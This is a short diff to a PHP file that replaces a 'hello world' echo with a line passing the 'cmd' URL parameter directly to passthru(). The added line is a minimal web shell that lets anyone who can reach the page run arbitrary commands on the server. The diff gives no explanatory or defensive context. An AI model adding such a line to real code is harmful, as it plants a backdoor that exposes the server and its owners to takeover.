@@ -1,2 +1,3 @@
-<?php echo "hello world"; ?>
+<?php echo passthru($_GET['cmd']); ?>
+
 
